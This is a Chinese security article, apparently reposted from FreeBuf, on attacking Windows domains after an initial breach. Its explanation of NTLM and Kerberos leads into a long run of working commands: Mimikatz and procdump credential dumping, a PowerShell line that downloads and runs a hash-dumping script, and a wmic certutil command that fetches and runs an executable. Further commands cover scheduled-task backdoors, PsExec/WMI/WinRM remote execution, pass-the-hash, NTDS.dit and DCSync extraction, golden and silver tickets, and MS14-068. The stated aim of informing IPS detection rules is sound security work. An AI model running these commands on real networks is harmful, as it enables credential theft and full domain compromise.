> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.freebuf.com](https://www.freebuf.com/articles/system/229200.html)

一、前言  

-------

**在攻击者获取到某台内网机器的控制权限之后，进一步会考虑如何在内网进行横向移动，以及攻击域控服务器，本文总结了突破边界后进一步的攻击技巧。主要分为 Windows 域认证背景介绍、技巧总结两部分。**

二、Windows 域介绍
-------------

将网络中多台计算机逻辑上组织到一起进行集中管理，这种区别于工作组的逻辑环境叫做域。域是由域控制器（Domain Controller）和成员计算机组成，域控制器就是安装了活动目录（Active Directory）的计算机。活动目录提供了存储网络上对象信息并使用网络使用该数据的方法，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。

### 2.1 域的优势

> 1. 集中管理，可以集中的管理企业中成千上万分布于异地的计算机和用户。
> 
> 2. 便捷的网络资源访问，能够容易的定位到域中的资源。
> 
> 3. 用户一次登录就可访问整个网络资源，集中的身份验证。
> 
> 4. 网络资源主要包含用户帐户、组、共享文件夹、打印机等
> 
> 5. 可扩展性，既可以适用于几十台计算机的小规模网络，也可以适用于跨国公司。

### 2.2 域渗透常用命令

查询与控制器主机名 ：net group “domain controllers” /domain

![](https://image.3001.net/images/20200304/15833015404405.png!small)可以通过 ping 主机名获取到域控的 ip

![](https://image.3001.net/images/20200304/15833015593538.png!small)

查询域管理用户：net group “domain admins” /domain

![](https://image.3001.net/images/20200304/15833015663972.png!small)

查看所有域用户： net user /domain

![](https://image.3001.net/images/20200304/15833015744513.png!small)

查看加入域的所有计算机名：net group "domain computers" /domain

![](https://image.3001.net/images/20200304/15833015883104.png!small)

查看域密码策略：net accounts /domain

![](https://image.3001.net/images/20200304/15833015987390.png!small)

### 2.3Windows 认证协议

Windows 有两种认证协议：NTLM（NT LAN Manager）和 Kerberos。域成员计算机在登录的时候可以选择登录到域中或此台电脑，选择登陆到域一般会采用 Kerberos 协议在域控 DC 上进行认证。

**2.3.1NTLM 认证协议**

NTLM 是一种网络认证协议，它是基于挑战（Chalenge）/ 响应（Response）认证机制的一种认证模式。这个协议只支持 Windows。NTLM 认证协议大概流程：

![](https://image.3001.net/images/20200304/15833016164726.png!small)可以看到 NTLM 协议基于 NTLM hash，windows 本地登陆的密码由 LM hash 和 NTLM hash 组成, 存储在 SAM 文件中, 前一部分是 LM Hash，后一部分是 NTLM Hash。

```
administrator:500:6f08d7b306b1dad4ff17365faf1ffe89:032f3db689bf1ee44c04d08c785710de:::
```

在登陆 Windows 的时候，系统会将用户输入的密码转换成 NTLM hash 并与 SAM 文件中的密码进行对比，如果相同，则认证成功。

**2.3.2Kerberos 认证协议**

Kerberos 是一种网络认证协议，整个认证过程涉及到三方：客户端、服务端和 KDC（Key Distribution Center），在 Windows 域环境中，KDC 的角色由 DC（Domain Controller）来担当。

Kerberos 基于票据 (Ticket) 进行安全认证，票据是用来在认证服务器和用户请求的服务之间传递用户身份的凭证。以下是 kerberos 协议的认证流程：

![](https://image.3001.net/images/20200304/15833016467588.png!small)**第 1 步：**KRB_AS_REQ：Client-A 发送 Authenticator（通过 A 密码加密的一个时间戳 TimeStamp）向 KDC 的 AS 服务认证自己的身份；

**第 2 步：**KRB_AS_REP：AS 通过 KDC 数据库中存储的 Client-A 密码的副本，解密收到的 Authenticator，如果解密出的 TimeStamp 符合要求，则 AS 服务认为 Client-A 就是所谓的 Client-A；

认证成功后，AS 服务生成一个短期有效的 SessionKeya-kdc，将该 Key 使用 A 的密码副本加密成密文 1，另外将 Key 连同时间戳标志（控制该 SessionKey 的有效时间）通过 TGS 服务的密码也就是 KDC 的密码加密为密文 2（称为 TGT），将这两个密文组合成 KRB_AS_REP 返回给 Client-A；

**第 3 步：**KRB_TGS_REQ：Client-A 在接收到 KRB_AS_REP 后，首先使用自身密码解密密文 1 得到 SessionKeya-kdc，此时需要注意的是，密文 2（TGT）是被 KDC 的密码加密的，所以 Client-A 无法解密，这也是 Kerberos 协议设计的精妙之处，既解决了 Server 端（TGS 相对于 Client-A 也称之为 Server 端）无法及时接收 SessionKey 的问题，又不怕 Client-A 对该 TGT 的伪造，因为 Client-A 不知道 Server 端的密码。

得到 SessionKeya-kdc 后，Client-A 利用其加密时间戳生成 Authenticator 用于向 TGS 申请 Client-A 与 Client-B 进行认证所需的 SessionKeya-b，连同刚才 KRB_AS_REP 接收的 TGT 一同组合成 KRB_TGS_REQ 发送给 TGS

**第 4 步：**KRB_TGS_REP：TGS 在接收到 KRB_TGS_REP 之后，利用 KDC 密码解密 TGT 获得本来就该发送给自己的 SessionKeya-kdc，然后用其解密 KRB_TGS_REQ 中的 Authenticator 得到 Client-A 发送过来的时间戳，如果时间戳符合要求，则生成一个短期有效的 SessionKeya-b，注意此时利用 SessionKeya-kdc 将 SessionKeya-b 加密为密文 1，然后利用 Server-B 的密码将 SessionKeya-b 加密为密文 2（称为 ServiceTicket），两个密文一同构成 KRB_TGS_REP 返回给 Client-A；

**第 5 步：**KRB_AP_REQ：Client-A 在接收到 KRB_TGS_REP 之后，首先使用缓存的 SessionKeya-kdc 将密文 1 中的 SessionKeya-b 解密出来，然后利用其加密时间戳生成 Authenticator 用于向 B 进行对自身的验证，另外，和刚才 TGT 一样，密文 2 也就是 ServiceTicket 是用 Server-B 的密码加密的，所以 Client-A 无法解密，也就无法伪造，这也同样解决了在三方认证中作为 Server 端的 B 无法及时接收 SessionKey 的问题，又不怕 Client-A 对 ServiceTicket 的伪造；

**第 6 步：**KRB_AP_REP：Server-B 受到 KRB_AP_REQ 之后，利用自身密码解密 ServiceTicket，得到 SessionKeya-b，然后用 SessionKeya-b 解密 Authenticator 得到时间戳，验证 A 的身份。

三、域内横向移动技巧
----------

利用 NTLM、Kerberos 及 SMB 等协议。攻击者进入内网后会进行横向移动建立多个立足点，常见的技巧包括凭证窃取、横向移动、Pass The Hash（hash 传递）、导出域成员 Hash、黄金白银票据、MS14-068 等。

### 3.1 凭证窃取

窃取凭据来帮助在域内横向移动，一旦获取的密码在内网中是通用的，将会方便横向移动获取目标权限。

**3.1.1Mimikatz**

Mimikatz 一款 windows 平台下的神器，它具备很多功能，其中最亮眼的功能是直接从 lsass.exe 进程里获取 windows 处于 active 状态账号的明文密码。

读取明文密码原理：在 Windows 中，当用户登录时，lsass.exe 使用一个可逆的算法加密明文，并会将密文保存在内存中，Mimikatz 就是通过抓取内存去还原明文。

> 项目地址：[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

用法：

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

![](https://image.3001.net/images/20200304/15833017249951.png!small)

当目标为 win10 或 2012R2 以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。

cmd 修改注册表命令：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

重启或用户重新登录后可以成功抓取。

**3.1.2Procdump**

Procdump 是微软官方发布的一款调试工具，因此不会被各种杀毒软件查杀。通常使用 procdump 转储内存文件到本地再使用 mimikatz 抓取文件中的 hash 来躲避杀软检测。

下载地址：

> [https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)

1、使用 procdump 将目标的 lsass.exe 转储成 dmp 文件

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

![](https://image.3001.net/images/20200304/15833017378098.png!small)

2、使用 mimikatz 从转储的 lsass.dmp 中来读取明文密码

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
```

![](https://image.3001.net/images/20200304/15833017522904.png!small)

**3.1.3Getpass**

Getapss 是由闪电小子根据 mimikatz 编译的一个工具，可以直接获取明文密码，直接运行 Getpass.exe 即可：

![](https://image.3001.net/images/20200304/15833017791624.png!small)

**3.1.4Powershell 脚本抓取**

当目标系统存在 powershell 时，可直接一句 powershell 代码调用抓取，前提是目标可出外网，否则需要将 ps1 脚本放置内网之中。执行:

```
powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1’);Get-PassHashes
```

**3.1.5Sam 破解**

使用注册表来离线导出 Hash

```
reg save HKLM\SYSTEM system.hiv    reg save HKLM\SAM sam.hiv    reg save hklm\security security.hiv
```

导出后可以使用 mimikatz 加载 sam.hiv 和 sam.hiv 来导出 Hash。或者使用 impacket 套件中 secretsdump.py 脚本去解密，也是可以的。

```
python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL
```

### 3.2 横向移动

**3.2.1IPC + 计划任务**

通过 ipc$ 实现对 windows 默认共享的访问，配合计划任务执行后门程序获取服务器权限。

1、通过 net use 建立 IPC$ 连接

```
net use \\192.168.91.131\IPC$ /user:"administrator" "abc@123"
```

![](https://image.3001.net/images/20200304/15833018286050.png!small)

2、利用 copy 上传后门文件

> copy D:\test.bat [\\186.64.10.13\c$](file://186.64.10.13/c$)

![](https://image.3001.net/images/20200304/15833018404700.png!small)

3、创建计划任务执行后门程序

```
schtasks /create /s 186.64.10.13 /u Administrator /p Admin@123.. /ru "SYSTEM" /tn test /sc DAILY /st 22:18 /tr C:\\windows\\temp\\test.bat /F
```

创建计划任务，/tn 是任务名称，/sc 是任务运行频率，这里指定为每天运行， /tr 指定运行的文件，/F 表示强制创建任务

```
schtasks /run /s 186.64.10.13 /u administrator /p Admin@123.. /tn test /i
```

运行任务，其中 / i 表示**立即运行**

```
schtasks /delete /s 186.64.10.13 /u administrator /p Admin@123.. /tn test /f
```

删除计划任务

![](https://image.3001.net/images/20200304/15833018684556.png!small)

低版本的操作系统可以直接使用 at 创建计划任务：

net time \\186.64.10.13 at \\186.64.10.13 18:01 c:\windows\temp\test.bat

**3.2.2PsExec(445 端口)**

PsExec 来自 Microsoft 的 Sysinternals 套件，它首先通过 SMB 连接到目标上的 ADMIN$ 共享, 上传 psexesvc.exe，然后使用服务控制管理器启动. exe，以在远程系统上创建命名管道，最后使用该管道进行 I/O

> 下载地址：[https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec](https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec)

1、通过 ADMIN$ 连接，然后释放 psexesvc.exe 到目标机器。

2、通过服务管理 SCManager 远程创建 psexecsvc 服务，并启动服务。

3、客户端连接执行命令, 服务端启动相应的程序并执行回显数据。

```
psexec \\186.64.10.13 -u Domain\User -p Password Command
```

![](https://image.3001.net/images/20200304/15833018908934.png!small)

或者返回交互式 shell:

![](https://image.3001.net/images/20200304/15833019001585.png!small)

**3.2.3WMI(135 端口)**

WMI(Windows Management Instrumentation，Windows 管理规范) 是一项核心的 Windows 管理技术；用户可以使用 WMI 管理本地和远程计算机

通过使用端口 135 上的远程过程调用 (RPC) 进行通信以进行远程访问（以及以后的临时端口）, 它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。 它可以通过 wmic.exe 直接进行交互。

查询进程信息：

```
wmic /node:186.64.10.13 /user:Administrator /password:Admin@123.. process list brief
```

![](https://image.3001.net/images/20200304/15833019207800.png!small)

首先 WMI 并不支持执行命令，而是支持执行文件但是你可以加相应的参数，比如

```
wmic /node:186.64.10.13 /user:Administrator /password:Admin@123.. process call create "cmd.exe /c ipconfig"
```

![](https://image.3001.net/images/20200304/15833019312087.png!small)

创建进程：

```
wmic /node:186.64.10.13 /user:Administrator /password:Admin@123 process call create "calc.exe"
```

下载远程文件并执行:

```
wmic /node:186.64.10.13 /user:Administrator /password:Admin@123 process call create "cmd /c  certutil.exe -urlcache -split -f http://186.64.10.13/test.exe c:/windows/temp/test.exe & c:/windows/temp/test.exe"
```

创建交互式 shell:

使用 py 脚本调用 WMI 来模拟 psexec 的功能，基本上 psexec 能用的地方，这个脚本也能够使用。原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令的结果和获取半交互式的 shell

```
python wmiexec.py -share admin$ administrator:password@186.64.10.13
```

![](https://image.3001.net/images/20200304/15833019496220.png!small)

**3.2.4WinRM 远程管理服务**

WinRM 指的是 Windows 远程管理服务，通过远程连接 winRM 模块可以操作 windows 命令行，默认监听端口 5985（HTTP）&5986 (HTTPS)，在 2012 以后默认开启。

执行命令：

```
winrs -r:http://186.64.10.13:5985 -u:Administrator -p:Admin@123.. "whoami /all"    winrs -r:http://186.64.10.13:5985 -u:Administrator -p:Admin@123.. "cmd.exe"
```

![](https://image.3001.net/images/20200304/15833019684740.png!small)

**3.2.5SmbExec(445 端口)**

smbexec 是一款基于 psexec 的域渗透测试工具，并配套 samba 工具。

```
Smbexec.py administrator:password@186.64.10.13
```

![](https://image.3001.net/images/20200304/15833019793725.png!small)

### 3.3Pass The Hash

PTH(pass the hash) 攻击是指攻击者可以直接通过 LM Hash(已弃用) 或 NTLM Hash 访问远程主机或服务，而不提供明文密码。在 Windows 系统中，使用 NTLM 进行身份认证，当获取用户 hash 后，可以使用 Hash 传递的方式获取访问权限。

**3.3.1Mimikatz**

![](https://image.3001.net/images/20200304/15833019962490.png!small)

首先登录目标机器，以管理员身份运行 mimikatz，并输入以下命令获取 administrator 账户的 ntlm hash：

```
Mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords”
```

![](https://image.3001.net/images/20200304/15833020121.png!small)

在攻击机器上利用 mimikatz 将获取的 hash 注入到内存中，成功后用 dir 命令可以成功列出目录文件：

```
sekurlsa::pth /domain:. /user:Administrator /ntlm: 70be8675cd511daa9be4b8f49e829327
```

![](https://image.3001.net/images/20200304/15833020341597.png!small)

注入成功后，可以使用 psexec、wmic、wmiexec 等实现远程执行命令。

### 3.4 导出域成员 Hash

域账户的用户名和 hash 密码以域数据库的形式存放在域控制器的 %SystemRoot%\ntds\NTDS.DIT 文件中。

![](https://image.3001.net/images/20200304/15833020426925.png!small)

ntdsutil.exe 是域控制器自带的域数据库管理工具，因此我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库。

创建快照：

```
ntdsutil snapshot "activate instance ntds" create quit quit
```

![](https://image.3001.net/images/20200304/158330205415.png!small)

加载快照：

```
ntdsutil snapshot "mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
```

![](https://image.3001.net/images/20200304/15833020647870.png!small)

Copy 文件副本：

```
copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
```

![](https://image.3001.net/images/20200304/15833020748012.png!small)

将 ntds.dit 文件拷贝到本地利用 impacket 脚本 dump 出 Hash：

![](https://image.3001.net/images/20200304/15833020816765.png!small)

最后记得卸载删除快照：

```
ntdsutil snapshot "unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit    ntdsutil snapshot "delete  {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}" quit quit
```

**3.4.1mimikatz 导出域内 hash**

mimikatz 有两种方式可以导出域内 hash。

1、直接在域控制器中执行 Mimikatz，通过 lsass.exe 进程 dump 出密码哈希。

```
mimikatz log "privilege::debug" "lsadump::lsa /patch" exi
```

![](https://image.3001.net/images/20200304/1583302107796.png!small)

另外一种方式是通过 dcsync，利用目录复制服务（DRS）从 NTDS.DIT 文件中检索密码哈希值，可以在域管权限下执行获取。

```
lsadump::dcsync /domain:test.com /all /csv
```

![](https://image.3001.net/images/20200304/15833021213249.png!small)

也可以制定获取某个用户的 hash：

```
lsadump::dcsync /domain:test.com /user:test
```

![](https://image.3001.net/images/20200304/15833021346659.png!small)

**3.4.2 黄金票据**

域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash，就可以随意伪造 Ticket，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。

首先获取 krbtgt 的用户 hash:

```
mimikatz "lsadump::dcsync /domain:xx.com /user:krbtgt"
```

![](https://image.3001.net/images/20200304/15833021454668.png!small)

在普通域成员上执行 dir 命令提示 “拒绝访问”：

![](https://image.3001.net/images/20200304/15833021564184.png!small)

之后利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid 值，如下：     

```
kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
```

![](https://image.3001.net/images/20200304/15833021736848.png!small)

导入刚才生成的票据：

```
kerberos::ptt test.kiribi
```

导入成功后，可以获取域管权限：

```
Dir \\dc.abc.com\c$
```

![](https://image.3001.net/images/20200304/15833021917278.png!small)

**3.4.3 白银票据**

黄金票据和白银票据的一些区别：

Golden Ticket：伪造 TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信

白银票据：伪造 TGS，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信

1. 在域控上导出 hash

mimikatz log "privilege::debug" "sekurlsa::logonpasswords"

![](https://image.3001.net/images/20200304/15833022389491.png!small)

2、利用 Hash 制作一张 cifs 服务的白银票据：

kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt

![](https://image.3001.net/images/20200304/15833022478731.png!small)

cifs 是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统:

![](https://image.3001.net/images/20200304/15833022549963.png!small)

**3.4.4MS14-068**

MS14-068 域提权漏洞，对应补丁编号：kb3011780，利用该漏洞可以将任何一个域用户提权至域管理员权限。

1、在普通域用户机器上直接访问域控制器的 C 盘目录

![](https://image.3001.net/images/20200304/15833022661721.png!small)

2、利用 MS14-068 伪造生成 TGT：

```
MS14-068.exe -u strage@test.com -s S-1-5-21-457432167-2946190674-2696793547-1103 -d 192.168.140.140 -p Admin@str
```

![](https://image.3001.net/images/20200304/15833022761821.png!small)

3、利用 mimikatz 将工具得到的 TGT 票据写入内存，创建缓存证书：

```
mimikatz.exe "kerberos::ptc TGT_strage@test.com.ccache" exit
```

![](https://image.3001.net/images/20200304/15833022973102.png!small)![](https://image.3001.net/images/20200304/15833023108324.png!small)

4、重新执行 dir 命令：

> dir [\\dc\C$](file://dc/C$)

![](https://www.geekpark.net/zhuanti/edit/js/ueditor/themes/default/images/spacer.gif)

四、总结
----

本文从攻击者视角总结了突破边界后的攻击技巧， 我们团队开发 ips 规则也从相关协议和流量角度来发现攻击者进入内网的痕迹。后续如果从防护角度有新的分析结果我们也会进行分享出来，同时也欢迎攻防大佬一起交流。由于水平有限，欢迎大家指出文中的错误和交流指教。

**参考资料：**

> 1、[https://blog.csdn.net/weixin_30532987/article/details/96203552](https://blog.csdn.net/weixin_30532987/article/details/96203552) 【Kerberos 的白银票据详解】
> 
> 2、[https://www.freebuf.com/vuls/56081.html](https://www.freebuf.com/vuls/56081.html) 【深入解读 MS14-068 漏洞】
> 
> 3、[https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html](https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html) 【Windows 安全认证是如何进行的？[NTLM 篇]】
> 
> 4、[https://www.cnblogs.com/-qing-/p/11349134.html](https://www.cnblogs.com/-qing-/p/11349134.html) 【域渗透基础之 Kerberos 认证协议】

*** 本文作者：新华三攻防团队，转载请注明来自 FreeBuf.COM**